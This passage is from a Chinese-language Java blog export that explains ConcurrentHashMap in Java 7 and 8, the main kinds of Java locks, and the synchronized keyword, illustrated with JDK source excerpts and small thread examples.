class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="comment">// speculatively create node</span></span><br><span class="line">                        <span class="comment">//初始化键值对，next指向null</span></span><br><span class="line">                        node = <span class="keyword">new</span> HashEntry&lt;K,V&gt;(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    retries = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(e.key))</span><br><span class="line">                    retries = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    e = e.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//超过最大自旋次数，阻塞</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (++retries &gt; MAX_SCAN_RETRIES) &#123;</span><br><span class="line">                lock();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//头节点发生变化，重新遍历</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((retries &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    (f = entryForHash(<span class="keyword">this</span>, hash)) != first) &#123;</span><br><span class="line">                e = first = f; <span class="comment">// re-traverse if entry changed</span></span><br><span class="line">                retries = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="size方法实现"><a href="#size方法实现" class="headerlink" title="size方法实现"></a>size方法实现</h3><p>在Java 7 中求ConcurrentHashMap的方式如下步骤：</p>
<ol>
<li>先不加锁，计算两次ConcurrentHashMap的大小，如果两次结果是一样的，说明是正确的，返回</li>
<li>如果两次结果不一样，则锁住所有的segment，重新计算所有segment的count之和。</li>
</ol>
<h4 id="size方法"><a href="#size方法" class="headerlink" title="size方法"></a>size方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Try a few times to get accurate count. On failure due to</span></span><br><span class="line">        <span class="comment">// continuous async changes in table, resort to locking.</span></span><br><span class="line">        <span class="keyword">final</span> Segment&lt;K,V&gt;[] segments = <span class="keyword">this</span>.segments;</span><br><span class="line">        <span class="keyword">int</span> size;</span><br><span class="line">        <span class="keyword">boolean</span> overflow; <span class="comment">// true if size overflows 32 bits</span></span><br><span class="line">        <span class="keyword">long</span> sum;         <span class="comment">// sum of modCounts</span></span><br><span class="line">        <span class="keyword">long</span> last = <span class="number">0L</span>;   <span class="comment">// previous sum</span></span><br><span class="line">        <span class="keyword">int</span> retries = -<span class="number">1</span>; <span class="comment">// first iteration isn't retry</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">//达到RETRIES_BEFORE_LOCK</span></span><br><span class="line">                <span class="keyword">if</span> (retries++ == RETRIES_BEFORE_LOCK) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; segments.length; ++j)</span><br><span class="line">                        ensureSegment(j).lock(); <span class="comment">// force creation</span></span><br><span class="line">                &#125;</span><br><span class="line">                sum = <span class="number">0L</span>;</span><br><span class="line">                size = <span class="number">0</span>;</span><br><span class="line">                overflow = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; segments.length; ++j) &#123;</span><br><span class="line">                    Segment&lt;K,V&gt; seg = segmentAt(segments, j);</span><br><span class="line">                    <span class="comment">//遍历计算segment的modCount和count的和</span></span><br><span class="line">                    <span class="keyword">if</span> (seg != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        sum += seg.modCount;</span><br><span class="line">                        <span class="keyword">int</span> c = seg.count;</span><br><span class="line">                        <span class="comment">//是否溢出int范围</span></span><br><span class="line">                        <span class="keyword">if</span> (c &lt; <span class="number">0</span> || (size += c) &lt; <span class="number">0</span>)</span><br><span class="line">                            overflow = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//last是上一次的sum值，相等跳出循环</span></span><br><span class="line">                <span class="keyword">if</span> (sum == last)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                last = sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//解锁</span></span><br><span class="line">            <span class="keyword">if</span> (retries &gt; RETRIES_BEFORE_LOCK) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; segments.length; ++j)</span><br><span class="line">                    segmentAt(segments, j).unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> overflow ? Integer.MAX_VALUE : size;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java-8中的ConcurrentHashMap"><a href="#Java-8中的ConcurrentHashMap" class="headerlink" title="Java 8中的ConcurrentHashMap"></a>Java 8中的ConcurrentHashMap</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>Java 8 中去除了Java 7 的segment分段锁，转而使用Node+synchronized+CAS来保证并发安全。</p>
<h3 id="put方法实现-1"><a href="#put方法实现-1" class="headerlink" title="put方法实现"></a>put方法实现</h3><p>ConcurrentHashMap在Java 8 的put步骤如下：</p>
<ol>
<li>根据key的hash值定位到table的首节点first；</li>
<li>如果为null，新增节点，通过cas的方式；</li>
<li>如果不为null，并且，first.hash == -1，说明其他线程正在扩容，参与一起扩容</li>
<li>如果不为null，并且first.hash != -1，Synchronized锁住first节点，判断是链表还是红黑树，遍历插入</li>
</ol>
<h3 id="size方法实现-1"><a href="#size方法实现-1" class="headerlink" title="size方法实现"></a>size方法实现</h3><p>由于没有segment的概念，所以只需要用一个 <code>baseCount</code> 变量来记录ConcurrentHashMap 当前 <code>节点的个数</code>。</p>
<ol>
<li>先尝试通过CAS 修改 <code>baseCount</code></li>
<li>如果多线程竞争激烈，某些线程CAS失败，那就CAS尝试将 <code>CELLSBUSY</code> 置1，成功则可以把 <code>baseCount变化的次数</code> 暂存到一个数组 <code>counterCells</code> 里，后续数组 <code>counterCells</code> 的值会加到 <code>baseCount</code> 中。</li>
<li>如果 <code>CELLSBUSY</code> 置1失败又会反复进行CAS <code>baseCount</code> 和 CAS <code>counterCells</code>数组</li>
</ol>
<h2 id="N句话总结"><a href="#N句话总结" class="headerlink" title="N句话总结"></a>N句话总结</h2><ol>
<li>去除 <code>Segment + HashEntry + Unsafe</code> 的实现，<br> 改为 <code>Synchronized + CAS + Node + Unsafe</code> 的实现<br> 其实 Node 和 HashEntry 的内容一样，但是HashEntry是一个内部类。<br> 用 Synchronized + CAS 代替 Segment ，这样锁的粒度更小了，并且不是每次都要加锁了，CAS尝试失败了再加锁。</li>
<li>put()方法中 初始化数组大小时，1.8不用加锁，因为用了个 <code>sizeCtl</code> 变量，将这个变量置为-1，就表明table正在初始化。</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/pange1991/article/details/85127013" target="_blank" rel="noopener">ConCurrentHashMap JDK1.7 和 JDK1.8 的区别</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>ConcurrentHashMap</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的锁</title>
    <url>/2020/03/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-10-%E5%A4%9A%E7%BA%BF%E7%A8%8B-01-Java%E4%B8%AD%E7%9A%84%E9%94%81/</url>
    <content><![CDATA[<h2 id="Java中的锁"><a href="#Java中的锁" class="headerlink" title="Java中的锁"></a>Java中的锁</h2><h2 id="Java中的锁分类"><a href="#Java中的锁分类" class="headerlink" title="Java中的锁分类"></a>Java中的锁分类</h2><p>在Java中，锁大致可以分为这些：</p>
<ul>
<li>公平锁/非公平锁</li>
<li>可重入锁/非可重入锁</li>
<li>排他锁（独享锁）/共享锁</li>
<li>乐观锁/悲观锁</li>
<li>分段锁</li>
<li>无锁/偏向锁/轻量级锁/重量级锁</li>
<li>自旋锁/适应性自旋锁</li>
</ul>
<p>这里并不是指的锁的状态，有些针对的是锁的特性。</p>
<h3 id="公平锁-非公平锁"><a href="#公平锁-非公平锁" class="headerlink" title="公平锁/非公平锁"></a>公平锁/非公平锁</h3><h4 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h4><p>公平锁是指多个线程按照申请锁的顺序来获取锁。采用的是先到先得的策略。在线程来获取锁的时候，直接进入队里排队，锁被其他线程释放了之后，队列中的第一个线程才能获取到锁。</p>
<p>公平锁具有以下优缺点：</p>
<p><strong>优点</strong>：所有等待锁的线程都具有获取到锁的机会，不会处于一直阻塞的状态；</p>
<p><strong>缺点：</strong>整体的吞吐率比非公平锁第。等待队列中除第一个线程以外的所有线程都会阻塞，而CPU唤醒阻塞线程的开销比非公平锁大。</p>
<h4 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h4><p>非公平锁是线程在要加锁的时候，直接去尝试是否能获取到锁，无视队列里面是否存在比它早到的其他线程。如果此时锁刚好被释放，那么此线程就直接获取到锁，不需要阻塞。</p>
<p>非公平锁具有以下优缺点：</p>
<p><strong>优点：</strong>可以减少CPU唤醒阻塞线程的开销，整体的吞吐率比公平锁高。有一定的概率，线程在获取锁的时候，刚好锁被其他线程释放，那么当前线程就减少了阻塞和被唤醒的开销。</p>
<p><strong>缺点：</strong>存在一定的概率导致队列中等待的线程一直等不到或者等很久才能拿到想要的锁。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-fair-unfair-lock.png" alt="公平锁/非公平锁示例"></p>
<h3 id="可重入锁-非可重入锁"><a href="#可重入锁-非可重入锁" class="headerlink" title="可重入锁/非可重入锁"></a>可重入锁/非可重入锁</h3><h4 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h4><p>可重入锁又名递归锁，是指同一个线程在外层方法获取到了锁之后，在进入内部的同步方法时，会自动获取锁。在Java中，synchronized和ReentrantLock都是可重入锁。</p>
<p>比如下面这段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String testString = <span class="string">"Do something"</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">doSomethingOutter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(testString);</span><br><span class="line">		doSomethingInner();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">doSomethingInner</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(testString);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面两个类方法中，doSomethingOutter和doSomethingInner都是被synchronized关键字修饰的。线程在调用doSometingOutter时，获取到了锁，此时在它内部在调用方法doSomethingInner就不需要等doSomethingOutter释放锁，可以直接进入该方法执行。</p>
<p>synchronized实现可重入参见文章<a href="http://huhansi.com/2020/03/10/Java/多线程/2020-03-10-多线程-02-synchronized关键字解析/">synchronized关键字解析</a></p>
<p>ReentrantLock实现可重入请参见文章<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-10-多线程-03-ReentrantLock解析/">ReentrantLock解析</a></p>
<h4 id="非可重入锁"><a href="#非可重入锁" class="headerlink" title="非可重入锁"></a>非可重入锁</h4><p>如果是非可重入锁的话，在进入doSomethingOutter之后，进入方法doSomethingInner之前，doSomethingInner方法需要获取锁，而此时doSomethingOutter方法还无法释放锁，就会造成死锁。</p>
<p>借用参考文献[1]中打水的例子。许多人在排队打水的时候，管理员允许一个人在获取锁之后可以给多个桶打水。当某个人打水时，先第一个桶和锁绑定打水，接着第二个，第三个，直到所有水桶都打完水之后，才将锁还给管理员。然后管理员把锁分配给下一个人。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-reentrant-dashui.png" alt="可重入方式打水"></p>
<p>如果管理员只允许一把锁只能给一个桶打水的话，在第一个人打完第一桶水之后，不会释放锁，这时候，打第二桶水又需要锁，却无法和锁绑定。导致当前线程出现死锁。剩下的所有线程都无法被唤醒。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-non-reentrant-dashui.png" alt="非可重入方式打水"></p>
<h3 id="排他锁（独享锁）-共享锁"><a href="#排他锁（独享锁）-共享锁" class="headerlink" title="排他锁（独享锁）/共享锁"></a>排他锁（独享锁）/共享锁</h3><p>排他锁指的是这个锁一次只能被一个线程所持有，其他线程如果需要的话，必须等当前线程释放该锁才可。如果线程T对数据A加上排他锁之后，其他线程不可再对数据A加任何类型的锁。获得排他锁的线程T即能读取数据又能修改数据。</p>
<p>共享锁指的是这个锁可以被多个线程所持有。</p>
<p>对ReentrantLock来说，它是独享锁。而另外一个ReadWriteLock。它的ReadLock是共享锁，可以被多个线程同时持有，而WriteLock是独享，排他的。如果线程T对数据A加上共享锁之火，其他线程只能对数据A加上共享锁，不能加排他锁。获得共享锁的线程只能读取数据，不能修改数据。</p>
<p>独享锁和共享锁也是通过AQS实现的，通过实现不同的方法，来实现独享或者共享。详情可参见<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-10-多线程-06-ReentrantReadWriteLock解析/">ReentrantReadWriteLock解析</a></p>
<h3 id="乐观锁-悲观锁"><a href="#乐观锁-悲观锁" class="headerlink" title="乐观锁/悲观锁"></a>乐观锁/悲观锁</h3><p>乐观锁和悲观锁不是什么锁的种类，而是看待并发同步的角度。</p>
<p>对于同一个数据的并发操作，悲观锁认为其在使用数据的时候，一定会有其他的线程来修改数据，因此，它在获取数据的时候会先加上锁，确保其他线程无法修改数据。在Java中，synchronized和Lock的实现类都是悲观锁。</p>
<p>而乐观锁则认为其在使用数据时，不会有其他的线程来修改数据，所以不会加锁，只是在更新数据的识货判断之前有没有别的线程已经修改了这个数据。如果这个数据没有被更新，当前线程将自己修改的数据写入。否则，根据不同的实现方式执行不同的操作（例如报错或者重试）。</p>
<p>乐观锁在Java中时通过无锁编程来实现的，最常采用的是CAS（Compare And Set）算法，Java原子类中的递增操作就是通过CAS自旋实现的。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-leguan-beiguan.png" alt="乐观锁/悲观锁图示"></p>
<p>根据上面的图示，可以得出：</p>
<ul>
<li>悲观锁适合写操作比较多的场景，先加锁可以保证写操作时数据正确。</li>
<li>乐观锁适合读操作多的场景，不加锁的特点能够使其读操作的性能大幅提升</li>
</ul>
<p>CAS算法可参考<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-05-Java-CAS-解析/#more">CAS算法解析</a></p>
<h3 id="分段锁"><a href="#分段锁" class="headerlink" title="分段锁"></a>分段锁</h3><p>分段锁是一种锁的设计，并不是一种具体的锁。是在JDK 1.7之中，ConcurrentHashMap采用的一种锁。ConcurrentHashMap就是通过它来实现并发的高效操作。</p>
<p>具体可参考<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-07-ConCurrentHashMap在Java1.7和1.8中的区别/">ConcurrentHashMap 在 Java 1.7 和 Java 1.8 中的区别</a></p>
<h3 id="无锁-偏向锁-轻量级锁-重量级锁"><a href="#无锁-偏向锁-轻量级锁-重量级锁" class="headerlink" title="无锁/偏向锁/轻量级锁/重量级锁"></a>无锁/偏向锁/轻量级锁/重量级锁</h3><h4 id="无锁"><a href="#无锁" class="headerlink" title="无锁"></a>无锁</h4><p>无锁，即没有对资源进行锁定，所有的线程都可以访问并修改同一个资源，但同时只能有一个线程修改成功。</p>
<p>无锁的特点就是修改操作在循环内进行，线程会不断地尝试比较待修改的值是不是和预期的值一致，是的话就修改成功，并退出，否则，继续循环尝试。</p>
<h4 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h4><p>偏向锁指的是同一段代码一直被同一个线程所访问，那么该线程后续再来访问的话，就会自动获取锁，减轻锁获取的代价。</p>
<p>大多数情况下，锁总是由同一线程多次获得，不存在多线程竞争，所以出现了偏向锁。其目标就是在只有一个线程执行同步代码块时能够提高性能。</p>
<p>偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁。偏向锁的撤销，需要等待全局安全点（在这个时间点上没有字节码正在执行），它会首先暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态。撤销偏向锁后恢复到无锁或轻量级锁（升级）的状态。</p>
<p>偏向锁在JDK 1.6及以后的JVM里是默认启用的。可以通过JVM参数关闭偏向锁：<strong>-XX:-UseBiasedLocking=false</strong>，关闭之后程序默认会进入轻量级锁状态。</p>
<h4 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h4><p>轻量级锁是指当锁是偏向锁的时候，被另外的线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞，从而提高性能。</p>
<h4 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a>重量级锁</h4><p>重量级锁是将除了拥有锁的线程以外的线程都阻塞。</p>
<p>这四种状态时针对synchronized关键字的，在Java1.5中引入了锁升级的机制来实现高效地synchronized。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-suoshengji.png" alt="锁升级顺序"></p>
<h3 id="自旋锁-适应性自旋锁"><a href="#自旋锁-适应性自旋锁" class="headerlink" title="自旋锁/适应性自旋锁"></a>自旋锁/适应性自旋锁</h3><h4 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h4><p>自旋锁的产生基于两个前提：</p>
<ul>
<li>有些时候线程切换所消耗的CPU周期比用户代码执行时间还长</li>
<li>大部分场景下，锁定资源的时间很短，在短时间内频繁地切换上下文，很可能得不偿失</li>
</ul>
<p>在这种前提下，就有了自旋锁。如果当前线程T去获取某个锁的时候，发现该锁已经被另外一个线程S所占有，此时它不阻塞自己，而是不放弃CPU的所有权，定期的去轮询线程S是否已经释放锁了，如果已经释放了，那么线程T就可以直接获取同步资源的锁了，直接略过线程休眠和唤起的开销。</p>
<p>自旋锁也存在缺点。如果线程S长时间没有释放锁的时候，线程T就会长时间占用CPU时间，白白浪费计算资源。所以，应该给自旋锁自旋时间加上上限，如果超过了一定次数，则挂起线程T。可以使用参数（<strong>-XX:PreBlockSpin</strong>）配置，默认是10次。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-spinlock.png" alt="自旋锁示例"></p>
<h4 id="适应性自旋锁"><a href="#适应性自旋锁" class="headerlink" title="适应性自旋锁"></a>适应性自旋锁</h4><p>适应性自旋锁意味着锁自旋的时间不再收参数控制，而是根据线程上一次获取到锁所耗费的自旋时间及锁的拥有者状态决定。</p>
<p>如果在同一个锁对象上，自旋等待刚刚成功获得过锁，并且持有锁的线程正在运行中，那么虚拟机就会认为这次自旋也是很有可能再次成功，进而它将允许自旋等待持续相对更长的时间。如果对于某个锁，自旋很少成功获得过，那在以后尝试获取这个锁时将可能省略掉自旋过程，直接阻塞线程，避免浪费处理器资源。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>下图是根据参考资料[1]稍微修改而来的脑图。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-locks.png.png" alt="Java中的锁"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[1].<a href="https://tech.meituan.com/2018/11/15/java-lock.html" target="_blank" rel="noopener">不可不说的Java“锁”</a></p>
<p>[2].<a href="https://www.cnblogs.com/qifengshi/p/6831055.html" target="_blank" rel="noopener">Java中的锁分类</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>synchronized关键字解析</title>
    <url>/2020/03/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-10-%E5%A4%9A%E7%BA%BF%E7%A8%8B-02-synchronized%E5%85%B3%E9%94%AE%E5%AD%97%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h2 id="synchronized关键字解析"><a href="#synchronized关键字解析" class="headerlink" title="synchronized关键字解析"></a>synchronized关键字解析</h2><h2 id="synchronized关键字的作用"><a href="#synchronized关键字的作用" class="headerlink" title="synchronized关键字的作用"></a>synchronized关键字的作用</h2><p>synchronized是Java在语言层面提供的一个用于线程并发同步的关键字。它可以应用在三个方面。</p>
<ul>
<li>修饰实例方法：作用于当前实例对象，对当前实例对象加锁，进入同步代码前需要获取当前实例的锁。</li>
<li>修饰静态方法：作用于当前类对象（XXX.class对象），进入同步代码前需要获取当前类对象的锁。</li>
<li>修饰代码块：作用域指定的对象，进入代码前需要获取指定对象的锁。</li>
</ul>
<h3 id="修饰实例方法"><a href="#修饰实例方法" class="headerlink" title="修饰实例方法"></a>修饰实例方法</h3><p>如下例程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// i++ 不具备原子性，需要锁来保护</span></span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SynchronizedTest st = <span class="keyword">new</span> SynchronizedTest();</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类SynchronizedTest的静态变量i是共享资源。对其的操作<strong>i++</strong>并不具有原子性，操作分三步：1. 取i原值；2. 加一；3. 存入新值。如果两个线程同时取了i值，同时加1，然后先后存入，就会导致i实际上只加了一次，存在线程安全问题。因此用synchronized关键字对addOne方法进行了修饰。确保同一时间只能有一个线程对i进行自增操作。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-200000.png" alt="加上synchronized关键字得到正确的结果"></p>
<p>注意：synchronized关键字修饰的是实例方法，这种场景下，锁住的是当前对象，也就是<strong>this</strong>。此时，其他线程无法在访问该对象的其他synchronized方法。</p>
<p>因此，下面这种场景下，是无法得到正确的值的。因为，虽然都是用synchronized修饰了addOne方法，但是他们锁住的是两个不同的SynchronizedTest对象。造成i结果互相干扰，每次执行结果不定。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 两个不同的实例对象，锁不住</span></span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修饰静态方法"><a href="#修饰静态方法" class="headerlink" title="修饰静态方法"></a>修饰静态方法</h3><p>静态方法是属于类而不是属于实例的。因此，synchronized修饰的静态方法锁定的是这个类对象。因此，上个章节的问题，就可以通过在方法addOne前面加上<strong>static</strong>修饰符解决。无论new出来多少个Synchronized对象，它的类对象始终只有一个，就不会存在线程安全的问题了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 这里加上static修饰符</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果当前线程T正在访问同步静态方法，那么其他的线程是否可以访问，这个类的非静态同步方法呢？答案是肯定的。因为，静态同步方法锁住的是类对象(XXX.class)，而非静态同步方法锁住的是当前对象，是两个不同的对象，二者互不干涉。</p>
<h3 id="修饰代码块"><a href="#修饰代码块" class="headerlink" title="修饰代码块"></a>修饰代码块</h3><p>Java允许对一小块代码使用synchronized关键字。此时可以使用任何对象充当被锁的对象。</p>
